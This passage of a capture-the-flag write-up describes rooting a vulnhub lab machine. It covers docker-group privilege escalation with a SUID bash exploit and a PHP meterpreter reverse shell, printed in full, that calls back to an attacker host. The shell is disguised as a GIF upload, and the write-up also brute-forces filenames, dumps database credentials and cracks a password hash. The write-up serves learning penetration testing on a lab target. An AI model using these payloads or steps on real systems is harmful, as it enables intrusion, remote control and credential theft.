root@252fa8cb1646:/# cat /home/hint 
Startup Script?
root@252fa8cb1646:/#
```

I decided to poke at the startup scripts in the containers, which is how I discovered ubuntu and wordpress were connected. We could easily edit the startup scripts in the containers, but again we gain nothing. I started looking at startup scripts on the host itself and found a bunch with `docker exec $something`. I decided to keep thinking about abusing docker. I tried some things. Some were dumb, many were pointless. I finally started looking back at regular old privesc on the host itself. I tried a kernel exploit, and it failed. I looked at SUID binaries again, and that's when I realized something that had been staring me in the face for a while.

Earlier, when I found the SUID binary in the user's home, `~/Desktop/a.out`, I checked it out with the `strings` command and it seemed safe enough, so I ran it; I don't care about this machine, it doesn't have internet access, and I can just revert if things break. It turns out that binary was just a `whoami`, but because of SUID, the output was `root`.

I also tried compiling an exploit for SUID myself at that time, but as an unprivileged user, you can't chown things to root.

```
hummingbirdscyber@vulnvm:~$ cat exploit.c 
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

I built/linked it with gcc, which was already installed:

`gcc -o exploit exploit.c`

Since I could chmod 4777 for SUID, but couldn't chown root:root first, I gave up when I first looked at this. Whoops!

We had root on all the docker containers, so all I needed to do was reuse an image that's already on the box (because no internet access), and create a bind mount to abuse the docker privileges.

```
hummingbirdscyber@vulnvm:~$ docker run -v $(pwd)/persist:/persist --name persist -d ubuntu:latest sleep 600 
d407a4a053b1513742ea6908887c1f8c97f5667f82a2afcce28ecb01c6b3fd4c
hummingbirdscyber@vulnvm:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES
d407a4a053b1        ubuntu:latest       "sleep 600"              1 second ago        Up 1 second                                persist
252fa8cb1646        ubuntu              "/bin/bash"              8 weeks ago         Up 13 hours                                brave_edison
1afdd1f6b82c        wordpress:latest    "docker-entrypoint.s…"   8 weeks ago         Up 13 hours         0.0.0.0:8000->80/tcp   experimental_wordpress_1
81a93420fd22        mysql:5.7           "docker-entrypoint.s…"   8 weeks ago         Up 13 hours         3306/tcp, 33060/tcp    experimental_db_1

```

Then we copy the exploit to the dir we used for our bind mount, and `docker exec` to get into the container and access the bind mount as root, and chown/chmod appropriately. This change persists to the host, so next we simply exit the container and execute the malicious SUID binary as our unprivileged user and become root.

```
hummingbirdscyber@vulnvm:~$ docker exec -it persist /bin/bash
root@d407a4a053b1:/# cd /persist/
root@d407a4a053b1:/persist# ls -l 
total 12
-rwxrwxr-x 1 1000 adm 8656 Apr 23 07:57 exploit
root@d407a4a053b1:/persist# chown root:root exploit 
root@d407a4a053b1:/persist# chmod 4777 exploit 
root@d407a4a053b1:/persist# ls -l 
total 12


-rwsrwxrwx 1 root root 8656 Apr 23 07:57 exploit
root@d407a4a053b1:/persist# exit
```

From our unprivileged shell:

```
hummingbirdscyber@vulnvm:~$ cd persist/
hummingbirdscyber@vulnvm:~/persist$ ./exploit 
root@vulnvm:~/persist# id
uid=0(root) gid=4(adm) groups=4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker),1000(hummingbirdscyber)
root@vulnvm:~/persist# 
```

I grabbed `/etc/shadow` and poked around a bit, but I didn't find anything new or exciting, so let's grab the flag.

```
root@vulnvm:~# cd /root/
root@vulnvm:/root# ls
flag
root@vulnvm:/root# cat flag 
Congratulations!                    



                                    


                              -ys-                                                               
                                /mms.                                                            
                                  +NMd+`                                                         
                               `/so/hMMNy-                                     
                                 `+mMMMMMMd/           ./oso/-                           
                                  `/yNMMMMMMMMNo`   .`   +-                   
                                  .oyhMMMMMMMMMMN/.     o.                  
                                    `:+osysyhddhs`    `o`                  
                                     .:oyyhshMMMh.   .:                      
                                  `-//:. `:sshdh: `                         
                                             -so:.                           
                                            .yy.                              
                                          :odh                            
                                        +o--d`                 
                                      /+. .d`                           
                                    -/`  `y`                                  
                                  `:`   `/                                    
                                 `.     `                    
root@vulnvm:/root# 

```

## Denouement

_(French for "untying of the knot"): resolution; conclusion or outcome of story._

We almost certainly didn't follow the intended path for this vulnhub machine. We still reached the goal. There's a valuable lesson there. Part of what makes this kind of thing fun is that there are many ways to solve the puzzle. In a formal pentest, we would have wanted to fully explore all avenues, or at least report them, but that's not the point of the gathering of friends I do this with. The point is for us to learn things and hone our (admittedly newbie) pentesting/offsec skills and enjoy hanging out. That mission was definitely achieved, because we all enjoyed the challenge and learned things in the process.

---

## Bonus PHP Upload Update

After publishing this post, I decided that I was not happy with the way I left the PHP weakness. I knew there was something there and I spent some time trying to understand what I missed.

### Nikto and Curl

I ran nikto and found this clue to help me:

```
Very early in the output I saw this gem we can use for php hax:


+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type

```

I dug around a lot and ended up revisiting some HTTP fundamentals, and also learning a few things about the GIF format.

### Make and Disguise a Payload

Let's make a payload with msfvenom for a reverse_tcp meterpreter shell:

```
root@kali:~/hackinos# msfvenom -p php/meterpreter/reverse_tcp  LHOST=192.168.167.130 LPORT=4444 -o revtcp.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1116 bytes
Saved as: revtcp.php
root@kali:~/hackinos# 
```

Then you prepend the gif filetype header "GIF89a;" to the payload make it pass the php image check:

```
root@kali:~/hackinos# cat gifrevtcp.php
GIF89a;
/*<?php /**/ error_reporting(0); $ip = '192.168.167.130'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

Next, we submit the payload with curl; it's also possible to do this via the browser, which I discovered only after working out the proper curl command:

```
root@kali:~/hackinos# curl -H"Content-Type: multipart/form-data" -F "file=@gifrev.php;type=image/gif" -F"submit=Submit"  http://target:8000/upload.php -iv --show-error --fail 2>&1 | grep -i upload
                                 Dload  Upload   Total   Spent    Left  Speed
> POST /upload.php HTTP/1.1
File uploaded /uploads/?
```

### Set Up a Handler

Setting LHOST/LPORT is pretty obvious, but it is also absolutely crucial to set the payload to match what we generated with msfvenom:`msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp`

Then set options as normal:

```
setting LHOST/LPORT is pretty obvious, but it is also absolutely crucial to set the payload to match what we generated with msfvenom:

msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp

Then set options as normal:

msf5 exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.167.130  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run
```

run/exploit here starts the handler listening

### Brute Force the Filename

```
root@kali:~/hackinos# cat fname.php 
for ($n = 1; $n <= 100 ; $n++ ) {
        $target_file = "uploads/". md5(basename("gifrev.php" . $n));
        echo "$target_file" . ".php" . "\n";
}
```

So doing this will give us a list of 100 relative URLs:

`php -r $(cat fname.php)`

and doing this will curl all of them; when we hit the one that was generated with rand(1,100), the curl will succeed, and execute our php reverse shell payload

`for u in $(php -r "$(cat fname.php)" ) ; do curl target:8000/${u} ; done`

### Getting a Meterpreter Session

```
msf5 exploit(multi/handler) > run                                                            
[*] Started reverse TCP handler on 192.168.167.130:4444                                                                                                                                 
[*] Sending stage (38247 bytes) to 192.168.167.132                                                                                                                                      
[*] Meterpreter session 10 opened (192.168.167.130:4444 -> 192.168.167.132:51206) at 2019-04-28 13:38:48 -0400                                                                                                                                                                                                                                                   
meterpreter > getuid                                                                                                                                                                    
Server username: www-data (33)                                                                                                                                                          
                                                                                                                                                                                                                                                                                                                                                           
meterpreter > bg                                                                                                                                                                        
[*] Backgrounding session 10... 
msf5 exploit(multi/handler) > 
msf5 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information                                                 Connection
  --  ----  ----                   -----------                                                 ----------
  2         meterpreter x86/linux  uid=1000, gid=1000, euid=1000, egid=1000 @ 192.168.167.132  192.168.167.130:4444 -> 192.168.167.132:54790 (192.168.167.132)
  9         meterpreter php/linux  www-data (33) @ 1afdd1f6b82c                                192.168.167.130:4444 -> 192.168.167.132:50294 (192.168.167.132)
  10        meterpreter php/linux  www-data (33) @ 1afdd1f6b82c                                192.168.167.130:4444 -> 192.168.167.132:51206 (192.168.167.132)

msf5 exploit(multi/handler) > sessions -i 10 
[*] Starting interaction with 10...

meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 14438 created.
Channel 0 created.
www-data@1afdd1f6b82c:/var/www/html/uploads$ pwd
pwd
/var/www/html/uploads
www-data@1afdd1f6b82c:/var/www/html/uploads$ whoami
whoami
www-data
www-data@1afdd1f6b82c:/var/www/html/uploads$ ls
ls
4b5fbe1f45d5e4762a39b3ab3b78be5f.gif  ae0f225a850ed2fa0dc0156a04f58561.gif
58e09caa30987a8bcff859ef289fddf9.gif
www-data@1afdd1f6b82c:/var/www/html/uploads$ 

```

Here, you can see where I was uploading actual gif files to figure this stuff out before trying with a shell. Although not explicitly shown here, there is a job that wipes all `*.php` files from the uploads directory every 300 seconds, so you have to get your payload in and execute it fairly quickly, since your payload might land within a few seconds before the delete job executes.

### Lateral Movement

From here, you can get the db creds out of `wp-config.php`. Once connected, you can also get host credentials.

```
www-data@1afdd1f6b82c:/var/www/html$ mysql -u wordpress -p -h db wordpress
mysql -u wordpress -p -h db wordpress
Enter password: wordpress

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 444
Server version: 5.7.25 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [wordpress]> show tables;
show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| host_ssh_cred         |
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
13 rows in set (0.00 sec)


MySQL [wordpress]> select * from host_ssh_cred;
select * from host_ssh_cred;
+-------------------+----------------------------------+
| id                | pw                               |
+-------------------+----------------------------------+
| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |
+-------------------+----------------------------------+
1 row in set (0.00 sec)

MySQL [wordpress]> 
```

Cracking this with john the ripper is trivial:

```
root@kali:~/hackinos# cat mysql.txt 
hummingbirdscyber:e10adc3949ba59abbe56e057f20f883e
root@kali:~/hackinos# john --format=Raw-MD5  mysql.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
No password hashes left to crack (see FAQ)
root@kali:~/hackinos# john --show --format=Raw-MD5  mysql.txt
hummingbirdscyber:123456

1 password hash cracked, 0 left
root@kali:~/hackinos# 
```

We can use this to SSH to the host and then escalate privileges via docker to gain root, as in the original post.

